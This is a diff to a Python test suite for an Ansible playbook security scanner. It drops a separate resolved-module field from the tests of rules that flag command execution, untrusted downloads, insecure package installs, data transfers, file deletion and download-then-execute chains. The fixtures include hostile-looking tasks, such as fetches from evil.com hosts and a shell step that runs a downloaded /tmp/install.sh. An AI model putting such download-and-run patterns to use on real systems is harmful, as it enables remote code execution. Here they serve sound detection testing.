@@ -62,7 +62,6 @@ from apme_engine.validators.native.rules.R115_file_deletion_graph import (
 def _make_task(
     *,
     module: str = "debug",
-    resolved_module: str = "",
     module_options: YAMLDict | None = None,
     name: str | None = None,
     file_path: str = "site.yml",
@@ -72,8 +71,7 @@ def _make_task(
     """Build a minimal playbook -> play -> task graph.
 
     Args:
-        module: Declared module name on the task.
-        resolved_module: Resolved FQCN for the module.
+        module: Module name as authored in YAML (short or FQCN).
         module_options: Module argument mapping.
         name: Optional task name.
         file_path: Source file path for the task.
@@ -100,7 +98,6 @@ def _make_task(
         line_start=line_start,
         name=name,
         module=module,
-        resolved_module_name=resolved_module,
         module_options=module_options or {},
         scope=NodeScope.OWNED,
     )
@@ -115,23 +112,19 @@ def _make_task(
 def _make_two_tasks(
     *,
     task1_module: str,
-    task1_resolved: str = "",
     task1_options: YAMLDict | None = None,
     task1_line: int = 5,
     task2_module: str,
-    task2_resolved: str = "",
     task2_options: YAMLDict | None = None,
     task2_line: int = 15,
 ) -> tuple[ContentGraph, str, str]:
     """Build a graph with two sibling tasks under the same play.
 
     Args:
-        task1_module: Module name for the first task.
-        task1_resolved: Resolved FQCN for the first task.
+        task1_module: Module name for the first task (as authored).
         task1_options: Module options for the first task.
         task1_line: Starting line for the first task.
-        task2_module: Module name for the second task.
-        task2_resolved: Resolved FQCN for the second task.
+        task2_module: Module name for the second task (as authored).
         task2_options: Module options for the second task.
         task2_line: Starting line for the second task.
 
@@ -154,7 +147,6 @@ def _make_two_tasks(
         file_path="site.yml",
         line_start=task1_line,
         module=task1_module,
-        resolved_module_name=task1_resolved,
         module_options=task1_options or {},
         scope=NodeScope.OWNED,
     )
@@ -163,7 +155,6 @@ def _make_two_tasks(
         file_path="site.yml",
         line_start=task2_line,
         module=task2_module,
-        resolved_module_name=task2_resolved,
         module_options=task2_options or {},
         scope=NodeScope.OWNED,
     )
@@ -191,15 +182,15 @@ class TestModuleRiskMapping:
         assert p is not None
         assert p.risk_type == "cmd_exec"
 
-    def test_short_name_fallback(self) -> None:
-        """Short name ``shell`` resolves via alias."""
-        p = get_risk_profile("", "shell")
+    def test_short_name_resolves(self) -> None:
+        """Bare short name ``shell`` resolves via short-name alias."""
+        p = get_risk_profile("shell")
         assert p is not None
         assert p.risk_type == "cmd_exec"
 
     def test_unknown_module(self) -> None:
         """Unknown module returns None."""
-        assert get_risk_profile("unknown.module", "unknown") is None
+        assert get_risk_profile("unknown.module") is None
 
     def test_resolve_field_direct(self) -> None:
         """Direct field mapping returns the value."""
@@ -248,8 +239,7 @@ class TestR101CommandExecGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="shell",
-            resolved_module="ansible.builtin.shell",
+            module="ansible.builtin.shell",
             module_options={"_raw_params": "{{ my_cmd }}"},
         )
         assert rule.match(g, nid)
@@ -266,8 +256,7 @@ class TestR101CommandExecGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="command",
-            resolved_module="ansible.builtin.command",
+            module="ansible.builtin.command",
             module_options={"_raw_params": "ls -la"},
         )
         assert rule.match(g, nid)
@@ -282,8 +271,7 @@ class TestR101CommandExecGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="command",
-            resolved_module="ansible.builtin.command",
+            module="ansible.builtin.command",
             module_options={"cmd": "echo {{ secret }}"},
         )
         result = rule.process(g, nid)
@@ -298,7 +286,7 @@ class TestR101CommandExecGraphRule:
         Args:
             rule: Rule instance under test.
         """
-        g, nid = _make_task(module="debug", resolved_module="ansible.builtin.debug")
+        g, nid = _make_task(module="ansible.builtin.debug")
         assert not rule.match(g, nid)
 
     def test_short_name(self, rule: CommandExecGraphRule) -> None:
@@ -323,8 +311,7 @@ class TestR101CommandExecGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="expect",
-            resolved_module="ansible.builtin.expect",
+            module="ansible.builtin.expect",
             module_options={"command": "{{ interactive_cmd }}"},
         )
         assert rule.match(g, nid)
@@ -357,8 +344,7 @@ class TestR104InvalidDownloadSourceGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="get_url",
-            resolved_module="ansible.builtin.get_url",
+            module="ansible.builtin.get_url",
             module_options={"url": "http://evil.com/pkg.tar.gz", "dest": "/tmp/"},
         )
         assert rule.match(g, nid)
@@ -375,8 +361,7 @@ class TestR104InvalidDownloadSourceGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="get_url",
-            resolved_module="ansible.builtin.get_url",
+            module="ansible.builtin.get_url",
             module_options={"url": "https://safe.com/pkg.tar.gz", "dest": "/tmp/"},
         )
         result = rule.process(g, nid)
@@ -390,8 +375,7 @@ class TestR104InvalidDownloadSourceGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="git",
-            resolved_module="ansible.builtin.git",
+            module="ansible.builtin.git",
             module_options={"repo": "http://git.evil.com/repo.git", "dest": "/opt/repo"},
         )
         result = rule.process(g, nid)
@@ -405,8 +389,7 @@ class TestR104InvalidDownloadSourceGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "/tmp/x", "state": "directory"},
         )
         assert not rule.match(g, nid)
@@ -436,8 +419,7 @@ class TestR107InsecurePkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="yum",
-            resolved_module="ansible.builtin.yum",
+            module="ansible.builtin.yum",
             module_options={"name": "httpd", "validate_certs": False},
         )
         assert rule.match(g, nid)
@@ -454,8 +436,7 @@ class TestR107InsecurePkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="dnf",
-            resolved_module="ansible.builtin.dnf",
+            module="ansible.builtin.dnf",
             module_options={"name": "nginx", "disable_gpg_check": True},
         )
         result = rule.process(g, nid)
@@ -469,8 +450,7 @@ class TestR107InsecurePkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="dnf",
-            resolved_module="ansible.builtin.dnf",
+            module="ansible.builtin.dnf",
             module_options={"name": "pkg", "allow_downgrade": True},
         )
         result = rule.process(g, nid)
@@ -484,8 +464,7 @@ class TestR107InsecurePkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="yum",
-            resolved_module="ansible.builtin.yum",
+            module="ansible.builtin.yum",
             module_options={"name": "httpd"},
         )
         result = rule.process(g, nid)
@@ -499,8 +478,7 @@ class TestR107InsecurePkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="yum",
-            resolved_module="ansible.builtin.yum",
+            module="ansible.builtin.yum",
             module_options={"name": "httpd", "validate_certs": "false"},
         )
         result = rule.process(g, nid)
@@ -532,8 +510,7 @@ class TestR113PkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="yum",
-            resolved_module="ansible.builtin.yum",
+            module="ansible.builtin.yum",
             module_options={"name": "{{ pkg_name }}"},
         )
         assert rule.match(g, nid)
@@ -550,8 +527,7 @@ class TestR113PkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="apt",
-            resolved_module="ansible.builtin.apt",
+            module="ansible.builtin.apt",
             module_options={"name": "nginx"},
         )
         result = rule.process(g, nid)
@@ -565,8 +541,7 @@ class TestR113PkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="pip",
-            resolved_module="ansible.builtin.pip",
+            module="ansible.builtin.pip",
             module_options={"requirements": "{{ req_file }}"},
         )
         result = rule.process(g, nid)
@@ -580,8 +555,7 @@ class TestR113PkgInstallGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="apt",
-            resolved_module="ansible.builtin.apt",
+            module="ansible.builtin.apt",
             module_options={"deb": "{{ deb_url }}"},
         )
         result = rule.process(g, nid)
@@ -613,8 +587,7 @@ class TestR105OutboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="uri",
-            resolved_module="ansible.builtin.uri",
+            module="ansible.builtin.uri",
             module_options={
                 "url": "{{ callback_url }}",
                 "method": "POST",
@@ -636,8 +609,7 @@ class TestR105OutboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="uri",
-            resolved_module="ansible.builtin.uri",
+            module="ansible.builtin.uri",
             module_options={"url": "{{ url }}", "method": "GET"},
         )
         assert not rule.match(g, nid)
@@ -649,8 +621,7 @@ class TestR105OutboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="uri",
-            resolved_module="ansible.builtin.uri",
+            module="ansible.builtin.uri",
             module_options={"url": "https://api.example.com/data", "method": "PUT"},
         )
         assert rule.match(g, nid)
@@ -665,8 +636,7 @@ class TestR105OutboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="uri",
-            resolved_module="ansible.builtin.uri",
+            module="ansible.builtin.uri",
             module_options={"url": "{{ url }}"},
         )
         assert not rule.match(g, nid)
@@ -696,8 +666,7 @@ class TestR106InboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="get_url",
-            resolved_module="ansible.builtin.get_url",
+            module="ansible.builtin.get_url",
             module_options={"url": "{{ download_url }}", "dest": "/tmp/pkg"},
         )
         assert rule.match(g, nid)
@@ -715,8 +684,7 @@ class TestR106InboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="get_url",
-            resolved_module="ansible.builtin.get_url",
+            module="ansible.builtin.get_url",
             module_options={"url": "https://example.com/file.tar.gz", "dest": "/tmp/"},
         )
         result = rule.process(g, nid)
@@ -730,8 +698,7 @@ class TestR106InboundTransferGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="git",
-            resolved_module="ansible.builtin.git",
+            module="ansible.builtin.git",
             module_options={"repo": "{{ repo_url }}", "dest": "/opt/code"},
         )
         result = rule.process(g, nid)
@@ -763,8 +730,7 @@ class TestR114FileChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "{{ target_path }}", "state": "directory"},
         )
         assert rule.match(g, nid)
@@ -781,8 +747,7 @@ class TestR114FileChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="template",
-            resolved_module="ansible.builtin.template",
+            module="ansible.builtin.template",
             module_options={"dest": "/etc/conf", "src": "{{ tmpl }}"},
         )
         result = rule.process(g, nid)
@@ -798,8 +763,7 @@ class TestR114FileChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="copy",
-            resolved_module="ansible.builtin.copy",
+            module="ansible.builtin.copy",
             module_options={"dest": "{{ dest_path }}", "src": "{{ src_file }}"},
         )
         result = rule.process(g, nid)
@@ -816,8 +780,7 @@ class TestR114FileChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "/etc/app/config", "state": "file"},
         )
         result = rule.process(g, nid)
@@ -831,8 +794,7 @@ class TestR114FileChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="lineinfile",
-            resolved_module="ansible.builtin.lineinfile",
+            module="ansible.builtin.lineinfile",
             module_options={"path": "{{ config_file }}", "line": "key=value"},
         )
         result = rule.process(g, nid)
@@ -864,8 +826,7 @@ class TestR115FileDeletionGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "{{ del_path }}", "state": "absent"},
         )
         assert rule.match(g, nid)
@@ -882,8 +843,7 @@ class TestR115FileDeletionGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "/tmp/cleanup", "state": "absent"},
         )
         assert rule.match(g, nid)
@@ -898,8 +858,7 @@ class TestR115FileDeletionGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="file",
-            resolved_module="ansible.builtin.file",
+            module="ansible.builtin.file",
             module_options={"path": "{{ p }}", "state": "directory"},
         )
         assert not rule.match(g, nid)
@@ -929,8 +888,7 @@ class TestR109ConfigChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="rpm_key",
-            resolved_module="ansible.builtin.rpm_key",
+            module="ansible.builtin.rpm_key",
             module_options={"key": "{{ gpg_key_url }}", "state": "present"},
         )
         assert rule.match(g, nid)
@@ -947,8 +905,7 @@ class TestR109ConfigChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="rpm_key",
-            resolved_module="ansible.builtin.rpm_key",
+            module="ansible.builtin.rpm_key",
             module_options={"key": "https://rpm.example.com/key.gpg", "state": "present"},
         )
         result = rule.process(g, nid)
@@ -962,8 +919,7 @@ class TestR109ConfigChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="apt_key",
-            resolved_module="ansible.builtin.apt_key",
+            module="ansible.builtin.apt_key",
             module_options={"url": "{{ key_url }}"},
         )
         assert rule.match(g, nid)
@@ -978,8 +934,7 @@ class TestR109ConfigChangeGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="apt_key",
-            resolved_module="ansible.builtin.apt_key",
+            module="ansible.builtin.apt_key",
             module_options={"data": "{{ key_data }}"},
         )
         result = rule.process(g, nid)
@@ -1011,12 +966,10 @@ class TestR103DownloadExecGraphRule:
             rule: Rule instance under test.
         """
         g, _, exec_id = _make_two_tasks(
-            task1_module="get_url",
-            task1_resolved="ansible.builtin.get_url",
+            task1_module="ansible.builtin.get_url",
             task1_options={"url": "{{ malicious_url }}", "dest": "/tmp/install.sh"},
             task1_line=5,
-            task2_module="shell",
-            task2_resolved="ansible.builtin.shell",
+            task2_module="ansible.builtin.shell",
             task2_options={"_raw_params": "/tmp/install.sh"},
             task2_line=15,
         )
@@ -1035,8 +988,7 @@ class TestR103DownloadExecGraphRule:
             rule: Rule instance under test.
         """
         g, nid = _make_task(
-            module="shell",
-            resolved_module="ansible.builtin.shell",
+            module="ansible.builtin.shell",
             module_options={"_raw_params": "/tmp/install.sh"},
         )
         result = rule.process(g, nid)
@@ -1050,12 +1002,10 @@ class TestR103DownloadExecGraphRule:
             rule: Rule instance under test.
         """
         g, _, exec_id = _make_two_tasks(
-            task1_module="get_url",
-            task1_resolved="ansible.builtin.get_url",
+            task1_module="ansible.builtin.get_url",
             task1_options={"url": "{{ url }}", "dest": "/tmp/downloaded"},
             task1_line=5,
-            task2_module="shell",
-            task2_resolved="ansible.builtin.shell",
+            task2_module="ansible.builtin.shell",
             task2_options={"_raw_params": "/opt/other_script.sh"},
             task2_line=15,
         )
@@ -1070,12 +1020,10 @@ class TestR103DownloadExecGraphRule:
             rule: Rule instance under test.
         """
         g, _, exec_id = _make_two_tasks(
-            task1_module="get_url",
-            task1_resolved="ansible.builtin.get_url",
+            task1_module="ansible.builtin.get_url",
             task1_options={"url": "https://safe.com/script.sh", "dest": "/tmp/script.sh"},
             task1_line=5,
-            task2_module="shell",
-            task2_resolved="ansible.builtin.shell",
+            task2_module="ansible.builtin.shell",
             task2_options={"_raw_params": "/tmp/script.sh"},
             task2_line=15,
         )
@@ -1090,12 +1038,10 @@ class TestR103DownloadExecGraphRule:
             rule: Rule instance under test.
         """
         g, dl_id, exec_id = _make_two_tasks(
-            task1_module="shell",
-            task1_resolved="ansible.builtin.shell",
+            task1_module="ansible.builtin.shell",
             task1_options={"_raw_params": "/tmp/install.sh"},
             task1_line=5,
-            task2_module="get_url",
-            task2_resolved="ansible.builtin.get_url",
+            task2_module="ansible.builtin.get_url",
             task2_options={"url": "{{ url }}", "dest": "/tmp/install.sh"},
             task2_line=15,
         )
@@ -1135,8 +1081,7 @@ class TestR103DownloadExecGraphRule:
             identity=NodeIdentity(path="site.yml/plays[0]/tasks[0]/block[0]", node_type=NodeType.TASK),
             file_path="site.yml",
             line_start=5,
-            module="get_url",
-            resolved_module_name="ansible.builtin.get_url",
+            module="ansible.builtin.get_url",
             module_options={"url": "{{ evil_url }}", "dest": "/tmp/run.sh"},
             scope=NodeScope.OWNED,
         )
@@ -1144,8 +1089,7 @@ class TestR103DownloadExecGraphRule:
             identity=NodeIdentity(path="site.yml/plays[0]/tasks[0]/block[1]", node_type=NodeType.TASK),
             file_path="site.yml",
             line_start=10,
-            module="shell",
-            resolved_module_name="ansible.builtin.shell",
+            module="ansible.builtin.shell",
             module_options={"_raw_params": "/tmp/run.sh"},
             scope=NodeScope.OWNED,
         )
@@ -1196,15 +1140,13 @@ class TestAnnotationRulesScanner:
         self,
         rules: list[GraphRule],
         module: str,
-        resolved: str,
         options: YAMLDict,
     ) -> list[object]:
         """Run rules through scanner and return violations.
 
         Args:
             rules: List of GraphRule instances.
-            module: Task module name.
-            resolved: Resolved FQCN.
+            module: Module FQCN on the task node (e.g. ``ansible.builtin.shell``).
             options: Module options dict.
 
         Returns:
@@ -1212,7 +1154,6 @@ class TestAnnotationRulesScanner:
         """
         g, _ = _make_task(
             module=module,
-            resolved_module=resolved,
             module_options=options,
         )
         report = scan(g, rules)
@@ -1222,7 +1163,6 @@ class TestAnnotationRulesScanner:
         """R101 fires through scanner."""
         violations = self._scan_with(
             [CommandExecGraphRule()],
-            "shell",
             "ansible.builtin.shell",
             {"_raw_params": "{{ cmd }}"},
         )
@@ -1232,7 +1172,6 @@ class TestAnnotationRulesScanner:
         """R107 fires through scanner."""
         violations = self._scan_with(
             [InsecurePkgInstallGraphRule()],
-            "yum",
             "ansible.builtin.yum",
             {"name": "httpd", "validate_certs": False},
         )
@@ -1242,7 +1181,6 @@ class TestAnnotationRulesScanner:
         """R113 fires through scanner."""
         violations = self._scan_with(
             [PkgInstallGraphRule()],
-            "dnf",
             "ansible.builtin.dnf",
             {"name": "{{ pkg }}"},
         )
@@ -1252,7 +1190,6 @@ class TestAnnotationRulesScanner:
         """R104 fires through scanner for HTTP URL."""
         violations = self._scan_with(
             [InvalidDownloadSourceGraphRule()],
-            "get_url",
             "ansible.builtin.get_url",
             {"url": "http://bad.com/x", "dest": "/tmp/"},
         )
@@ -1262,7 +1199,6 @@ class TestAnnotationRulesScanner:
         """R106 fires through scanner."""
         violations = self._scan_with(
             [InboundTransferGraphRule()],
-            "get_url",
             "ansible.builtin.get_url",
             {"url": "{{ dl_url }}", "dest": "/tmp/"},
         )
@@ -1272,7 +1208,6 @@ class TestAnnotationRulesScanner:
         """R105 fires through scanner for POST with templated URL."""
         violations = self._scan_with(
             [OutboundTransferGraphRule()],
-            "uri",
             "ansible.builtin.uri",
             {"url": "{{ api }}", "method": "POST"},
         )
@@ -1282,7 +1217,6 @@ class TestAnnotationRulesScanner:
         """R114 fires through scanner."""
         violations = self._scan_with(
             [FileChangeGraphRule()],
-            "file",
             "ansible.builtin.file",
             {"path": "{{ p }}", "state": "file"},
         )
@@ -1292,7 +1226,6 @@ class TestAnnotationRulesScanner:
         """R115 fires through scanner for deletion with templated path."""
         violations = self._scan_with(
             [FileDeletionGraphRule()],
-            "file",
             "ansible.builtin.file",
             {"path": "{{ p }}", "state": "absent"},
         )
@@ -1302,7 +1235,6 @@ class TestAnnotationRulesScanner:
         """R109 fires through scanner."""
         violations = self._scan_with(
             [ConfigChangeGraphRule()],
-            "rpm_key",
             "ansible.builtin.rpm_key",
             {"key": "{{ key }}", "state": "present"},
         )
@@ -1311,12 +1243,10 @@ class TestAnnotationRulesScanner:
     def test_r103_via_scanner(self) -> None:
         """R103 fires through scanner for download-then-execute."""
         g, _, exec_id = _make_two_tasks(
-            task1_module="get_url",
-            task1_resolved="ansible.builtin.get_url",
+            task1_module="ansible.builtin.get_url",
             task1_options={"url": "{{ url }}", "dest": "/tmp/run.sh"},
             task1_line=5,
-            task2_module="shell",
-            task2_resolved="ansible.builtin.shell",
+            task2_module="ansible.builtin.shell",
             task2_options={"_raw_params": "/tmp/run.sh"},
             task2_line=15,
         )
